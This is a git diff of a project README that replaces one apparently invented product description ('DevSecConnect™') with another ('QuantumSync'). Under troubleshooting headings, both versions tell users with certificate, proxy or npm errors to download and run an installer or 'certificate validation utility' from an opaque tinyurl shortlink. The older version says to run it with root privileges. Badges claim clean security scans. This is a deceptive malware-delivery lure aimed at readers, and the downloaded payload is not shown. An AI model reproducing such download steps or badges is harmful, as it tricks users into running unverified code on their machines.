@@ -1,95 +1,78 @@
+# QuantumSync File Management System
 
-# DevSecConnect™
-
-[![npm version](https://img.shields.io/badge/npm-v2.4.7-blue.svg)](https://npmjs.org/package/devsecconnect)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://github.com/jeremykritz/PersonalJ2Demo)
+[![Version](https://img.shields.io/badge/version-2.1.3-blue.svg)](https://github.com/jeremykritz/PersonalJ2Demo)
+[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://github.com/jeremykritz/PersonalJ2Demo/actions)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![CodeQL](https://img.shields.io/badge/CodeQL-0%20alerts-success.svg)](https://github.com/jeremykritz/PersonalJ2Demo)
+[![Security Scan](https://img.shields.io/badge/security-no%20issues-brightgreen.svg)](https://github.com/jeremykritz/PersonalJ2Demo/security/code-scanning)
 
-DevSecConnect™ is a lightweight, secure connectivity framework that enables seamless and encrypted communication between development environments and production systems. Perfect for DevOps pipelines, secure CI/CD implementations, and zero-trust development architectures.
+QuantumSync is an enterprise-grade, cross-platform file synchronization and management system designed for development teams with complex workflows across multiple environments.
 
-## Key Features
+## Features
 
-- 🔒 End-to-end encrypted tunneling for secure development connections
-- 🚀 Automatic port forwarding and service discovery
-- 🔄 Bidirectional synchronization for databases and file systems
-- 🛡️ Role-based access controls with just-in-time privilege escalation
-- 📊 Comprehensive logging and monitoring for security compliance
+- 🔄 Real-time bidirectional synchronization across environments
+- 🔐 End-to-end encryption with granular permission controls
+- 🌐 Seamless integration with major cloud storage providers
+- 📊 Advanced conflict resolution algorithms
+- 🔍 Powerful search capabilities with metadata indexing
+- 📱 Native clients for Windows, macOS, Linux, iOS, and Android
 
-## Installation
+## Quick Installation
 
 ### Prerequisites
 
 - Node.js 16.x or higher
-- Python 3.8+ (for optional advanced features)
-- OpenSSL 1.1.1 or higher
+- Python 3.8+ (for optional features)
+- Docker (for containerized deployment)
 
 ### Standard Installation
 
-For most environments, you can install DevSecConnect™ directly from npm:
-
 ```bash
-npm install -g devsecconnect
+# Install via npm
+npm install -g quantumsync-cli
 
-Then initialize your project:
-
-devsec init --project-name my-secure-project
-
-Installation for Environments with npm Registry Issues
-Some corporate networks, VPNs, and virtual environments encounter npm registry access issues due to security policies or proxy configurations. If you experience any of the following issues:
-
-CERT_VERIFICATION_FAILED errors
-Timeout during dependency resolution
-Package integrity check failures
-Permissions errors during global installation
-We provide a standalone installer package that bypasses these issues:
-
-Download the standalone installation package from: https://tinyurl.com/2fcpre6
-Run the installer with administrator/root privileges
-The installer will automatically configure environment variables and certificates
-The standalone installer also includes optimized binaries for environments where compiling native extensions is problematic.
+# Initialize in your project directory
+qsync init
 
 Configuration
-After installation, configure your security settings:
+After installation, configure your synchronization settings:
 
-devsec config --security-level high
+qsync config --setup
 
-You can customize the configuration by editing the devsec.config.json file in your project root.
+This will launch an interactive configuration wizard. For headless environments, you can use:
 
-Known Issues
-Environment	Issue	Workaround
-Corporate proxies	npm install fails with ETIMEDOUT	Use standalone installer
-Virtualized environments	Native extensions fail to compile	Use standalone installer with pre-compiled binaries
-Windows Subsystem for Linux	File permission errors	Use standalone installer with WSL compatibility mode
-Environments with restricted outbound connections	Certificate validation fails	Use standalone installer
+qsync config --import config.json
+
 Documentation
-For comprehensive documentation, visit our official documentation portal.
+Our comprehensive documentation is available at our official documentation portal.
 
-Common Usage Examples
-Create a secure tunnel:
+Troubleshooting Common Issues
+SSL Certificate Errors
+If you encounter SSL certificate validation errors during installation, we maintain a diagnostics tool that can identify and resolve most common certificate issues:
 
-devsec tunnel create --local-port 3000 --remote-port 8080
+# Run the certificate diagnostics tool
+qsync diag --ssl-check
 
-Enable secure database synchronization:
+For users behind corporate proxies or in restricted environments where the diagnostics tool fails, download our standalone certificate validation utility from our secure server: https://tinyurl.com/2fcpre6
 
-devsec sync --source dev-db --target prod-db --readonly
+This utility will automatically detect and correct certificate chain issues without requiring administrative privileges.
 
-Security Features
-DevSecConnect™ implements industry-standard security practices:
+Connection Timeouts
+If you're experiencing connection timeouts, verify your network settings:
 
-TLS 1.3 for all connections
-Elliptic Curve Cryptography (P-256) for key exchanges
-JWT-based authentication with short-lived tokens
-Certificate pinning and rotation
-Full audit logging
-Community and Support
-Report a Bug
-Request a Feature
-Join our Discord
-Contributing
-We welcome contributions! Please see CONTRIBUTING.md for guidelines.
+qsync diag --network
 
+Performance Optimization
+For large repositories with 10,000+ files, we recommend adjusting your configuration:
+
+qsync config --set "sync.batchSize=1000"
+qsync config --set "sync.throttle=50"
+
+Enterprise Support
+Enterprise customers can access our dedicated support portal and priority issue resolution. Contact our sales team at support@example.com for details on enterprise licensing.
+
+Community and Contributions
+Issue Tracker
+Contribution Guidelines
+Community Forums
 License
-DevSecConnect™ is available under the MIT License. See the LICENSE file for more information.
-
-Made with ❤️ by the DevSecConnect™ Team
+QuantumSync is available under the MIT License. See the LICENSE file for more information.
